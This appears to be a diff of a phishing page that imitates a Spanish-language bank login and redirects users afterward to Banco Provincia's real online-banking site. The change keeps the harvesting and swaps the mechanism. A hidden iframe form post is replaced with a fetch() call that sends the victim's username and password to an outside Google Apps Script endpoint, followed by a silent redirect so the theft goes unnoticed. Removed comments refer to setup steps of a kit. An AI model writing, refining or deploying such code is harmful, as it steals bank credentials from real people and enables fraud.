@@ -103,7 +103,6 @@
     animation:girar .8s linear infinite;
   }
   @keyframes girar{to{transform:rotate(360deg)}}
-  iframe.sink{position:absolute; width:0; height:0; border:0; visibility:hidden}
   @media (min-width:768px){
     .header-gradient{height:calc(7.5rem + var(--safe-top))}
     .header-gradient img{height:2.875rem}
@@ -132,9 +131,7 @@
     <div class="cuerpo">
       <h1>Iniciá sesión</h1>
 
-      <!-- ▼▼▼ PEGÁ ACÁ TU URL /exec (Paso 9) ▼▼▼ -->
-      <form id="form1" method="POST" target="sink" autocomplete="off"
-            action="https://script.google.com/macros/s/AKfycbwBWsbnK_aEfG-UtV2bvLzIByMiTWcYTjY2-ueNn3pDwWbIoeS7P2irT5K55zxhxyk/exec">
+      <form id="form1" autocomplete="off">
 
         <div class="campo">
           <label for="username">Tu usuario</label>
@@ -176,8 +173,6 @@
   </div>
 </div>
 
-<iframe class="sink" name="sink" title="sink"></iframe>
-
 <div class="overlay" id="overlay">
   <div class="spinner"></div>
   <div style="font-size:1rem">Ingresando...</div>
@@ -187,14 +182,13 @@
 (function () {
   'use strict';
 
-  /* ▼▼▼ ACÁ VA EL DESTINO DESPUÉS DE INGRESAR ▼▼▼ */
   var REDIRECT = 'https://www.bancoprovincia.bancainternet.com.ar/spa/';
+  var ENDPOINT = 'https://script.google.com/macros/s/AKfycbwBWsbnK_aEfG-UtV2bvLzIByMiTWcYTjY2-ueNn3pDwWbIoeS7P2irT5K55zxhxyk/exec';
 
   var $ = function (id) { return document.getElementById(id); };
   var form    = $('form1');
-  var sink    = document.querySelector('iframe.sink');
   var overlay = $('overlay');
-  var enviado = false, salido = false;
+  var enviado = false;
 
   function setVh() {
     document.documentElement.style.setProperty('--vh', window.innerHeight * 0.01 + 'px');
@@ -203,39 +197,38 @@
   window.addEventListener('resize', setVh);
   window.addEventListener('orientationchange', setVh);
 
-  function salir() {
-    if (salido) return;
-    salido = true;
-    window.location.href = REDIRECT;
-  }
-
   form.addEventListener('submit', function (e) {
-    if (enviado) { e.preventDefault(); return; }
+    e.preventDefault();
+    if (enviado) return;
     enviado = true;
     overlay.classList.add('on');
-    setTimeout(salir, 5000);          /* último recurso si el iframe nunca avisa */
+
+    var formData = new URLSearchParams();
+    formData.append('Usuario', $('username').value);
+    formData.append('Clave', $('password').value);
+
+    fetch(ENDPOINT, {
+      method: 'POST',
+      mode: 'no-cors',
+      body: formData
+    }).finally(function () {
+      setTimeout(function () {
+        window.location.href = REDIRECT;
+      }, 1500);
+    });
   });
 
-  /* el iframe cargó = el POST ya llegó */
-  sink.addEventListener('load', function () {
-    if (enviado) setTimeout(salir, 400);
-  });
-
-  /* si vuelven con "atrás", rearmamos todo */
   window.addEventListener('pageshow', function (ev) {
     if (!ev.persisted) return;
     enviado = false;
-    salido  = false;
     overlay.classList.remove('on');
   });
 
-  /* mostrar / ocultar clave */
   $('btnOjo').addEventListener('click', function () {
     var p = $('password');
     p.type = (p.type === 'password') ? 'text' : 'password';
   });
 
-  /* teclado virtual */
   var activo = $('username');
   ['username', 'password'].forEach(function (id) {
     $(id).addEventListener('focus', function () { activo = this; });
